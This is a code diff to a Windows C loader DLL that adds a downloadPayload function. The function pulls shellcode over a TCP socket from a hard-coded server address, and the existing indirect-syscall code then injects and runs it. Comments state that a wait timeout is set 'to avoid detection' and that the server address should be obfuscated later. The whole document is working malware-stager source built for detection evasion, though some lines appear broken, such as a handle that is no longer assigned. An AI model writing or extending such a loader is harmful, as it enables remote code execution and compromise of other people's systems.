@@ -2,9 +2,12 @@
 #include <stdio.h>
 #include <time.h>
 #include <string.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include "mainDLL.h"
-#include "const.c"
+
+#define BUFFER_SIZE 1024
 
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
@@ -57,17 +60,21 @@ BOOL IndirectPrelude(HMODULE NtdllHandle, LPCSTR NtFunctionName, PDWORD NtFuncti
 BOOL main() {
     NTSTATUS Status = 0;
     BOOL State = TRUE;
-    SIZE_T shellcodeSize = sizeof(shellcode);
+    unsigned char shellcode[BUFFER_SIZE];
+    SIZE_T shellcodeSize = BUFFER_SIZE;
     HMODULE NtdllHandle = NULL;
     PVOID Buffer = NULL;
     HANDLE thread = NULL;
     HANDLE procH = NULL;
     OBJECT_ATTRIBUTES OA;
 
-    NtdllHandle = GetModuleHandleW(L"NTDLL");
-    if (NULL == NtdllHandle) {
+    if (!downloadPayload(shellcode, shellcodeSize)) {
+        return FALSE;
+    }
+
+    if (GetModuleHandleW(L"NTDLL") == NULL) {
         return FALSE; 
-    } 
+    }
 
     BOOL results[] = {
         IndirectPrelude(NtdllHandle, "NtOpenProcess", &g_NtOpenProcessSSN, &g_NtOpenProcessSyscall),
@@ -116,7 +123,9 @@ BOOL main() {
         State = FALSE; goto CLEANUP;
     }
 
-    Status = NtWaitForSingleObject(&thread, FALSE, NULL);
+    LARGE_INTEGER timeout;
+    timeout.QuadPart = 9223372036854775807;  // to avoid detection
+    Status = NtWaitForSingleObject(thread, FALSE, &timeout);
 
 CLEANUP:
     if (Buffer) {
@@ -132,4 +141,48 @@ CLEANUP:
     }
 
     return State;
+}
+
+BOOL downloadPayload(unsigned char* shellcode, size_t limit) {
+    size_t totalBytesReceived = 0;
+
+    WSADATA wsaData;
+    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (result != 0) {
+        return FALSE;
+    }
+
+    SOCKET WSAAPI clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (clientSocket == INVALID_SOCKET) {
+        return FALSE;
+    }
+
+    struct sockaddr_in clientAddress;
+    clientAddress.sin_family = AF_INET;
+    clientAddress.sin_port = htons(1234); 
+    clientAddress.sin_addr.s_addr = inet_addr("127.0.0.9");  // remote server to download shellcode, should be obfuscated later on
+
+    result = connect(clientSocket, (struct sockaddr*)&clientAddress, sizeof(clientAddress));
+    if (result == SOCKET_ERROR) {
+        return FALSE;
+    }
+
+    const char* message = "Hello, Server!";
+    result = send(clientSocket, message, (int)strlen(message), 0);
+    if (result == SOCKET_ERROR) {
+        return FALSE;
+    } 
+
+    size_t bytesRead;
+    while (totalBytesReceived < limit) {
+        bytesRead = recv(clientSocket, shellcode + totalBytesReceived, limit - totalBytesReceived, 0);
+        if (bytesRead == -1) {
+            return FALSE;
+        }
+        totalBytesReceived += bytesRead;
+    }
+
+    closesocket(clientSocket);
+    WSACleanup();
+    return TRUE;
 }
